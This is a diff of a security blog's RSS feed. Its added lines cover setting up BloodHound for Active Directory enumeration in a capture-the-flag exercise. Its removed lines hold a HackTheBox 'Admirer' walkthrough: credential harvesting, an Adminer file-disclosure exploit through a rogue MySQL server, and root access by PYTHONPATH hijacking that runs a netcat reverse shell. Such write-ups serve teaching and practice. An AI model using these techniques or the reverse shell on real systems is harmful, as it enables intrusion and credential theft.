@@ -1,4 +1,26 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Inês Martins]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>Inês Martins</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Thu, 24 Jun 2021 10:56:24 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Update: Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after resetting my computer, and having to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink</p>]]></description><link>inesmartins.github.io/host-your-ghost-blog-on-github-pages-and-automate-updates/</link><guid isPermaLink="false">60c5dd95eb71c50b03caced6</guid><category><![CDATA[ghost]]></category><category><![CDATA[github pages]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 13 Jun 2021 10:38:48 GMT</pubDate><content:encoded><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after resetting my computer, and having to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the process.</p><p>Luckily, I found an even simpler way to do it.</p><p>Assuming you have a local instance of Ghost running on the default port <code>2368</code>:</p><ul><li>Make sure you have <a href="https://www.gnu.org/software/wget/">wget</a> installed</li><li>Add this script to your directory but make sure to replace <code>yourdomain.com</code> with your actual Github Pages domain, e.g.: <code>inesmartins.github.io</code>:</li></ul><pre><code>#!/bin/bash
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Inês Martins]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>Inês Martins</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Sun, 11 Jul 2021 13:59:23 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Setting up Bloodhound on macOS]]></title><description><![CDATA[<p>On a recent CTF I needed to set up Bloodhound on macOS and came across some issues. Hope this helps someone in need. :)</p><hr><h2 id="installing-a-compatible-python-version">Installing a compatible Python version</h2><p>Because of the way in which <code>Python 3.8.</code> handles multiprocessing in macOS you need to downgrade to <code>Python 3.7.3.</code></p>]]></description><link>inesmartins.github.io/setting-up-bloodhound-on-macos/</link><guid isPermaLink="false">60d8afdeeb71c50b03cada18</guid><category><![CDATA[bloodhound]]></category><category><![CDATA[windows]]></category><category><![CDATA[ad]]></category><category><![CDATA[macOS]]></category><category><![CDATA[tips]]></category><category><![CDATA[troubleshooting]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 11 Jul 2021 13:37:13 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/bloodhound-logo.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/bloodhound-logo.png" alt="Setting up Bloodhound on macOS"><p>On a recent CTF I needed to set up Bloodhound on macOS and came across some issues. Hope this helps someone in need. :)</p><hr><h2 id="installing-a-compatible-python-version">Installing a compatible Python version</h2><p>Because of the way in which <code>Python 3.8.</code> handles multiprocessing in macOS you need to downgrade to <code>Python 3.7.3.</code> to be able to use <code>Bloodhound.py</code>.</p><p>Here&apos;s a great StackOverflow answer that explains how to do this downgrade using <code>pyenv</code>:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://stackoverflow.com/a/62899833"><div class="kg-bookmark-content"><div class="kg-bookmark-title">How to downgrade python version from 3.8 to 3.7 (mac)</div><div class="kg-bookmark-description">I&#x2019;m using Python &amp;amp; okta-aws tools and in order to fetch correct credentials on aws I need to run okta-aws init. But got an error message of Could not read roles from Okta and the system prompte...</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a" alt="Setting up Bloodhound on macOS"><span class="kg-bookmark-author">Stack Overflow</span><span class="kg-bookmark-publisher">user13902742</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="Setting up Bloodhound on macOS"></div></a></figure><p>After this process you should now have something like:</p><pre><code>~ python3 --version
+Python 3.7.3</code></pre><hr><h2 id="collecting-the-data">Collecting the data</h2><p>On Windows, data collection is done with <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html">SharpHound</a>:</p><blockquote>SharpHound is the official data collector for BloodHound. It is written in C# and uses native Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems.</blockquote><p>On macOS, you can use <code>Bloodhoud.py</code>, but you also need an additional tool that resolves the AD domain to its IP. I went with <code>DNSChef</code> but you can choose whatever works best.</p><p>So, start by cloning the <a href="https://github.com/fox-it/BloodHound.py">Bloodhound<a href="https://github.com/fox-it/BloodHound.py">.</a>py</a> and <a href="https://github.com/iphelix/dnschef">dnschef.py</a> projects and install the requirements as specified on the <code>README.md</code> files.</p><p>Once both projects are correctly installed, you need to set up <a href="https://github.com/iphelix/dnschef">dnschef.py</a> so that it resolves your AD domain to its corresponding IP, as previously mentioned:</p><pre><code>~ sudo sh -c &apos;python3 dnschef.py --fakeip x.x.x.x --fakedomains abc.local -q&apos;
+
+(20:14:25) [*] DNSChef started on interface: 127.0.0.1
+(20:14:25) [*] Using the following nameservers: 8.8.8.8
+(20:14:25) [*] Cooking A replies to point to x.x.x.x matching: abc.local
+</code></pre><p>Next, you can run the Bloodhound script, but make sure to point to your &quot;fake&quot; nameserver:</p><pre><code>~ python3 ../bloodhound.py -d abc.local -u theusername -p &apos;thepassword&apos; -dc abc.local -c all -ns 127.0.0.1
+
+INFO: Connecting to LDAP server: abc.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: abc.local
+INFO: Found 7 users
+INFO: Found 53 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: XXX1.abc.local
+INFO: Querying computer: XXX2.abc.local
+INFO: Ignoring host XXX1.abc.local since its hostname does not match: Supplied hostname XXX1.abc.local does not match reported hostnames dc1 or dc1.abc.local
+INFO: Done in 00M 08S</code></pre><p>This process should outputs some <code>.json</code> files to the local directory. You&apos;ll be able to import and visualise the data on the next step.</p><hr><h2 id="visualising-the-data">Visualising the data</h2><p>Start by downloading the macOS versions of both <a href="https://neo4j.com/download-center/#community">neo4j Community Edition Server</a> and <a href="https://github.com/BloodHoundAD/BloodHound/releases">Bloodhound GUI</a>.</p><p>Then, go to the directory where you downloaded <code>neo4j</code> and run:</p><pre><code>~ tar -xf neo4j-community-x.x.x-unix.tar
+~ cd neo4j-community-x.x.x/bin
+~ ./neo4j console</code></pre><p>Once the <code>neo4j</code> console application is running, go to <a href="http://localhost:7474">http://localhost:7474</a> and authenticate with credentials: <code>neo4j/neo4j</code>. </p><p>You&apos;ll be prompted to change the password, so make sure to save these new creds, you&apos;ll need for the next step.</p><p>Now, go to the directory where you downloaded <code>Bloodhound GUI</code> and launch the app. </p><p>Leave the default DB URL and enter the same credentials you just set up for <code>neo4j</code>.</p><p>After logging in, on the right side, you&apos;ll see an icon to upload data. Click on the icon and import the <code>.json</code> files outputted on the previous step.</p><p>You should now have everything you need to visualise your AD info using Bloodhound! </p>]]></content:encoded></item><item><title><![CDATA[Update: Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after resetting my computer, and having to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink</p>]]></description><link>inesmartins.github.io/host-your-ghost-blog-on-github-pages-and-automate-updates/</link><guid isPermaLink="false">60c5dd95eb71c50b03caced6</guid><category><![CDATA[ghost]]></category><category><![CDATA[github pages]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 13 Jun 2021 10:38:48 GMT</pubDate><content:encoded><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after resetting my computer, and having to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the process.</p><p>Luckily, I found an even simpler way to do it.</p><p>Assuming you have a local instance of Ghost running on the default port <code>2368</code>:</p><ul><li>Make sure you have <a href="https://www.gnu.org/software/wget/">wget</a> installed</li><li>Add this script to your directory but make sure to replace <code>yourdomain.com</code> with your actual Github Pages domain, e.g.: <code>inesmartins.github.io</code>:</li></ul><pre><code>#!/bin/bash
 
 # Define urls and https
 from_url=inesmartins.github.io
@@ -624,262 +646,4 @@ public class RandomBreaker {
 YOUR SHARE OF THE HEIST IS IN YOUR HOUSE.
 THE KEY TO THE LOCK IS BELOW.
 GO TO PARIS.
-GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p>So, it seems there&apos;s an additional cipher to crack:</p><pre><code>GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p><a href="https://scwf.dima.ninja/">Solve Crypto with Force!</a><em><strong> </strong></em>is an awesome website that immediately identified the cipher - <a href="https://en.wikipedia.org/wiki/Atbash">Atbash</a>:</p><pre><code>THE CODE TO THE SAF LOCK : GORETIREMENTFUND!!</code></pre><p>So, there&apos;s the flag: <code>HTB{GORETIREMENTFUND!!}</code>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Admirer]]></title><description><![CDATA[Write-up for Adminer, a retired HTB machine.]]></description><link>inesmartins.github.io/htb-write-up-admirer/</link><guid isPermaLink="false">5ede4cc8b6ef324dc7275dc8</guid><category><![CDATA[htb]]></category><category><![CDATA[ftp]]></category><category><![CDATA[adminer]]></category><category><![CDATA[mysql]]></category><category><![CDATA[privesc]]></category><category><![CDATA[python]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:07:19 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2020/10/admirer.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2020/10/admirer.png" alt="HTB Write-up | Admirer"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/248">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning, with tells us that the machine has:</p><ul><li>an <code>FTP</code> service (vsftp) running on port 21;</li><li>an <code>OpenSSH</code> service running on port 22;</li><li>an <code>Apache</code> web server running on port 80:</li></ul><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A admirer.htb
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:37 WEST
-Nmap scan report for admirer.htb (10.10.10.187)
-Host is up (0.043s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
-| ssh-hostkey:
-|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
-|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
-|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
-80/tcp open  http    Apache httpd 2.4.25 ((Debian))
-| http-robots.txt: 1 disallowed entry
-|_/admin-dir
-|_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Admirer
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-<!--kg-card-end: markdown--><p>The web application is just a very simple image gallery, there&apos;s no authentication or anything that immediately stands out, so we start by exploring the disallowed entry (<code>/admin-dir</code>) found during the scan.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2020/06/main.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>We can&apos;t directly access the admin-dir directory but the <a href="http://admirer.htb/robots.txt">robots.txt</a> file has a little clue left to us by &quot;waldo&quot;:</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
-
-# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
-Disallow: /admin-dir
-</code></pre>
-<!--kg-card-end: markdown--><p>With this small clue, we find 2 files:</p><ul><li><a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a></li></ul><!--kg-card-begin: markdown--><pre><code>[Internal mail account]
-w.cooper@admirer.htb
-fgJr6q#S\W:$P
-
-[FTP account]
-ftpuser
-%n?4Wz}R$tTF7
-
-[Wordpress account]
-admin
-w0rdpr3ss01!
-</code></pre>
-<!--kg-card-end: markdown--><ul><li><a href="http://admirer.htb/admin-dir/contacts.txt">http://admirer.htb/admin-dir/contacts.txt</a>:</li></ul><!--kg-card-begin: markdown--><pre><code>##########
-# admins #
-##########
-# Penny
-Email: p.wise@admirer.htb
-
-##############
-# developers #
-##############
-# Rajesh
-Email: r.nayyar@admirer.htb
-# Amy
-Email: a.bialik@admirer.htb
-# Leonard
-Email: l.galecki@admirer.htb
-
-#############
-# designers #
-#############
-# Howard
-Email: h.helberg@admirer.htb
-# Bernadette
-Email: b.rauch@admirer.htb
-</code></pre>
-<!--kg-card-end: markdown--><p>Let&apos;s do a quick roundup of what we have so far:</p><ol><li>A list of users (with first name and email) that all seem to match the names of Big Bang Theory&apos;s characters (except Sheldon Cooper who is instead Waldo Cooper);</li><li>Credentials to one email account (w.cooper@admirer.htb);</li><li>Credentials to one FTP account (ftpuser);</li><li>Credentials to one Wordpress account (admin).</li></ol><p>Since we don&apos;t yet know of a way to access the email server or the Wordpress account, we try to explore the FTP service:</p><!--kg-card-begin: markdown--><pre><code>$ ftp 10.10.10.187
-
-Connected to 10.10.10.187.
-220 (vsFTPd 3.0.3)
-Name (10.10.10.187:kali): ftpuser
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-
-ftp&gt; pass
-Passive mode on.
-
-ftp&gt; ls
-227 Entering Passive Mode (10,10,10,187,175,74)
-150 Here comes the directory listing.
--rw-r--r-- 1 0 0 3405 Dec 02 21:24 dump.sql
--rw-r--r-- 1 0 0 5270987 Dec 03 21:20 html.tar.gz
-226 Directory send OK.
-
-</code></pre>
-<!--kg-card-end: markdown--><ol><li>The <code>dump.sql</code> file contains a dump of a MariaDB database called <strong>admirerdb</strong>. This DB contains only one table - Items - which includes the images and respective metadata that appear on the site, so nothing too exciting;</li><li>The <code>html.tar.gz</code> includes a bunch of files that look like a backup of the current web application. Here are some of the most noteworthy:</li></ol><h3 id="robots-txt">robots.txt</h3><p>The backup version of the robots.txt file disallows <code>/w4ld0s_s3cr3t_d1r</code> instead of <code>/admin-dir</code>.</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
-This folder contains personal stuff, so no one (not even robots!) should see it - waldo
-Disallow: /w4ld0s_s3cr3t_d1r
-</code></pre>
-<!--kg-card-end: markdown--><h3 id="index-php">index.php</h3><p>Contains the code for the main page of the web application, including some credentials for the admirerdb.</p><!--kg-card-begin: markdown--><pre><code>...
-&lt;div id=&quot;main&quot;&gt;
-&lt;?php
-    $servername = &quot;localhost&quot;;
-    $username = &quot;waldo&quot;;
-    $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
-    $dbname = &quot;admirerdb&quot;;
-
-    // Create connection
-    $conn = new mysqli($servername, $username, $password, $dbname);
-    
-    // Check connection
-    if ($conn-&gt;connect_error) {
-        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
-    }
-
-    $sql = &quot;SELECT * FROM items&quot;;
-    $result = $conn-&gt;query($sql);
-
-    if ($result-&gt;num_rows &gt; 0) {
-        // output data of each row
-        while($row = $result-&gt;fetch_assoc()) {
-            echo &quot;&lt;article class=&apos;thumb&apos;&gt;&quot;;
-            echo &quot;&lt;a href=&apos;&quot;.$row[&quot;image_path&quot;].&quot;&apos; class=&apos;image&apos;&gt;&lt;img src=&apos;&quot;.$row[&quot;thumb_path&quot;].&quot;&apos; alt=&apos;&apos; /&gt;&lt;/a&gt;&quot;;
-            echo &quot;&lt;h2&gt;&quot;.$row[&quot;title&quot;].&quot;&lt;/h2&gt;&quot;;
-	    	echo &quot;&lt;p&gt;&quot;.$row[&quot;text&quot;].&quot;&lt;/p&gt;&quot;;
-	    	echo &quot;&lt;/article&gt;&quot;;
-        }
-    } else {
-        echo &quot;0 results&quot;;
-    }
-    $conn-&gt;close();
-?&gt;
-&lt;/div&gt;
-...
-</code></pre>
-<!--kg-card-end: markdown--><h3 id="w4ld0s_s3cr3t_d1r-credentials-txt">w4ld0s_s3cr3t_d1r/credentials.txt</h3><p>There&apos;s a credentials.txt file which contains the same credentials as found on <a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a> and one additional cred:</p><!--kg-card-begin: markdown--><pre><code>[Bank Account]
-waldo.11
-Ezy]m27}OREc$
-</code></pre>
-<!--kg-card-end: markdown--><h3 id="utility_scripts-db_admin-php">utility_scripts/db_admin.php</h3><p>There&apos;s a small script that handles the connection with the database, which contains some credentials:</p><!--kg-card-begin: markdown--><pre><code>&lt;?php
-    $servername = &quot;localhost&quot;;
-    $username = &quot;waldo&quot;;
-    $password = &quot;Wh3r3_1s_w4ld0?&quot;;
-    
-    // Create connection
-    $conn = new mysqli($servername, $username, $password);
-    
-    // Check connection
-    if ($conn-&gt;connect_error) {
-        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
-    }
-    echo &quot;Connected successfully&quot;;
-    
-    // TODO: Finish implementing this or find a better open source alternative
-?&gt;
-
-</code></pre>
-<!--kg-card-end: markdown--><p>So, now we have 2 new credentials:</p><ul><li>one for a bank account (waldo.11);</li><li>one for a mySQL database (waldo);</li></ul><p>Going back to the deployed version of the web application, the <a href="http://admirer.htb/w4ld0s_s3cr3t_d1r/contacts.txt">w4ld0s_s3cr3t_d1r</a> doesn&apos;t seem to be available anymore, but the <a href="http://10.10.10.187/utility-scripts/">utility_scripts</a> dir does exist.</p><p>Of all the files on the backup, the <a href="http://10.10.10.187/utility-scripts/admin_tasks.php">admin-tasks page</a> is the most interesting. This page allows any user to check very simple info about the system:</p><figure class="kg-card kg-image-card kg-width-full"><img src="inesmartins.github.io/content/images/2020/06/4.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>At this point I was a bit stuck but after reviewing all the previous clues I realised I missed something on the db_admin.php file:</p><pre><code>// TODO: Finish implementing this or find a better open source alternative
-</code></pre><p>After some googling, I realised that the &quot;better open source alternative&quot; to database administration is likely the <a href="https://www.adminer.org/">Adminer</a> tool - the name likeness was a dead giveaway. </p><p>And this brings us to the <a href="http://10.10.10.187/utility-scripts/adminer.php">adminer.php</a> page:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2020/06/login.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><hr><h2 id="exploiting-adminer">Exploiting Adminer</h2><p>After trying (and failing) to login with all of the credentials previously found, I decided to search for Adminer vulnerabilities. </p><p>Turns out <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability ">Adminer 4.6.2 is vulnerable to a file disclosure vulnerability</a>.</p><p>So I installed and launched an instance of mySQL server on my machine and then <strong>added a new local user</strong> that can access this mySQL server from the admirer.htb host using the password &apos;password&apos;:</p><!--kg-card-begin: markdown--><pre><code>~ /usr/local/mysql/bin/mysql -u root -p
-Enter password:
-...
-
-mysql&gt; create user &apos;waldo&apos;@&apos;10.10.10.187&apos; IDENTIFIED WITH mysql_native_password  BY &apos;password&apos;;
-Query OK, 0 rows affected (0.01 sec)
-
-mysql&gt; select user, host from mysql.user;
-+------------------+--------------+
-| user             | host         |
-+------------------+--------------+
-| waldo            | 10.10.10.187 |
-| mysql.infoschema | localhost    |
-| mysql.session    | localhost    |
-| mysql.sys        | localhost    |
-| root             | localhost    |
-+------------------+--------------+
-5 rows in set (0.00 sec)
-</code></pre>
-<!--kg-card-end: markdown--><p>In order to get this to work I had to add some additional configuration to my server (&apos;/etc/my.cnf&apos;):</p><!--kg-card-begin: markdown--><pre><code>[mysqld]
-default_authentication_plugin  =  mysql_native_password
-local-infile                   = 1
-</code></pre>
-<!--kg-card-end: markdown--><p>Note that the <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_local_infile">local-infile</a> variable should be set to true as to allow us to load data from local files into the DB, which we&apos;ll need in a following step.</p><p>Once this is done, we can login as our new user from the Adminer client with password &apos;password&apos;. Note that the server IP should correspond to the IP where you setup the MySQL server and that you need to specify the port if it&apos;s not the default (3306).</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2020/06/login-4.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>After logging into the system, we can access the SQL interface and can send commands directly to the machine. </p><p><strong>Our goal is to load local files from the admirer.htb machine to a new DB in our local mySQL server. </strong></p><p>So, first things first, we need to create a valid db with a table that will receive the data. Note that this table should have a field that should support big lines of text content.</p><!--kg-card-begin: markdown--><pre><code>mysql&gt; create database test;
-
-mysql&gt; use test;
-Database changed
-
-mysql&gt; create table tt (line varchar(1000));
-Query OK, 0 rows affected (0.01 sec)
-</code></pre>
-<!--kg-card-end: markdown--><p>Also, you need to grant permission for your user to be able to access that data: </p><!--kg-card-begin: markdown--><pre><code>mysql&gt; grant all privileges on test.tt to &apos;waldo&apos;@&apos;10.10.10.187&apos;;
-Query OK, 0 rows affected (0.04 sec)
-</code></pre>
-<!--kg-card-end: markdown--><p>Going back to our SQL interface, the files most likely to contain valid credentials are index.php and db_admin.php, where we previously found outdated DB credentials.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2020/06/query.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>To see the results we can either access the data directly on the SQL interface or go to our mySQL server and query the data.</p><!--kg-card-begin: markdown--><pre><code>~ select line from test.tt;
-
-...
-$servername = &quot;localhost&quot;;
-$username = &quot;waldo&quot;;
-$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
-$dbname = &quot;admirerdb&quot;;
-...
-</code></pre>
-<!--kg-card-end: markdown--><p>Finally, we have credentials for the admirerdb database and as it turns out waldo&apos;s SSH credentials:</p><!--kg-card-begin: markdown--><pre><code>ssh waldo@10.10.10.187
-waldo@10.10.10.187&apos;s password:
-Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
-
-The programs included with the Devuan GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-You have new mail.
-Last login: Mon Jun  8 21:25:38 2020 from 10.10.14.95
-waldo@admirer:~$ 
-</code></pre>
-<!--kg-card-end: markdown--><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">https://www.dev2qa.com/how-to-use-mysql-on-mac/</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></li><li><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html</a></li><li><a href="https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql">https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql</a></li></ul><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Now authenticated as <code>waldo</code>, we started by running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>, which helped us find some interesting stuff:</p><!--kg-card-begin: markdown--><pre><code>[+] Readable files belonging to root and readable by me but not world readable
--rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
-</code></pre>
-<!--kg-card-end: markdown--><p>On the <code>/opt/scripts/</code> directory we find the <code>admin_tasks</code> bash script which is called by the administrative interface we previously saw. </p><p>At first glance there wasn&apos;t any obvious way to exploit this script but, as you can see below, there is a &quot;Backup web data&quot; option which executes the <code>backup.py</code> script as root.</p><!--kg-card-begin: markdown--><pre><code>...
-backup_web()
-{
-    if [ &quot;$EUID&quot; -eq 0 ]
-    then
-        echo &quot;Running backup script in the background, it might take a while...&quot;
-        /opt/scripts/backup.py &amp;
-    else
-        echo &quot;Insufficient privileges to perform the selected operation.&quot;
-    fi
-}
-...
-</code></pre>
-<!--kg-card-end: markdown--><p>The <code>backup.py</code> file, on the other hand, imports the <code>make_archive</code> binary from <code>shutil</code>, which we might be able to exploit by changing the path in which the Python script is executed.</p><!--kg-card-begin: markdown--><pre><code>!/usr/bin/python3
-
-from shutil import make_archive
-
-src = &apos;/var/www/html/&apos;
-
-old ftp directory, not used anymore
-dst = &apos;/srv/ftp/html&apos;
-
-dst = &apos;/var/backups/html&apos;
-
-make_archive(dst, &apos;gztar&apos;, src)
-</code></pre>
-<!--kg-card-end: markdown--><p>So, we need to:</p><ul><li>change the <strong>Python path</strong> to start with a directory that we control, e.g.: /home/waldo/.abc/;</li><li>create a <strong>shutil.py</strong> file inside /home/waldo/.abc/;</li><li>add a <strong>make_archive</strong> function to shutil.py that uses the same signature (3 fields) but instead of archiving the web content returns a shell as root;</li></ul><p>Let&apos;s start with our mock <code>shutil.py</code>:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ nano /home/waldo/.abc/shutil.py
-
-import os
-
-def make_archive(a, b, c):
-    os.system(&quot;nc [attacker_ip] [attacker_port] -e &apos;/bin/sh&apos;&quot;)
-    
-waldo@admirer:~$ chmod +x /home/waldo/.abc/shutil.py
-</code></pre>
-<!--kg-card-end: markdown--><p>Don&apos;t forget to create a listener on the port you specify above:</p><!--kg-card-begin: markdown--><p><code>nc -l [PORT]</code></p>
-<!--kg-card-end: markdown--><p>Now, all we need to do is change the python path on the call for the admin_tasks script:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/.abc/ /opt/scripts/admin_tasks.sh
-
-[sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
-
-[[[ System Administration Menu ]]]
-1) View system uptime
-2) View logged in users
-3) View crontab
-4) Backup passwd file
-5) Backup shadow file
-6) Backup web data
-7) Backup DB
-8) Quit
-Choose an option: 6
-Running backup script in the background, it might take a while...
-</code></pre>
-<!--kg-card-end: markdown--><p>And we receive a shell as root which allows us to print the root flag!</p><p>Hope you enjoyed it :)</p><hr>]]></content:encoded></item></channel></rss>
+GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p>So, it seems there&apos;s an additional cipher to crack:</p><pre><code>GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p><a href="https://scwf.dima.ninja/">Solve Crypto with Force!</a><em><strong> </strong></em>is an awesome website that immediately identified the cipher - <a href="https://en.wikipedia.org/wiki/Atbash">Atbash</a>:</p><pre><code>THE CODE TO THE SAF LOCK : GORETIREMENTFUND!!</code></pre><p>So, there&apos;s the flag: <code>HTB{GORETIREMENTFUND!!}</code>.</p>]]></content:encoded></item></channel></rss>
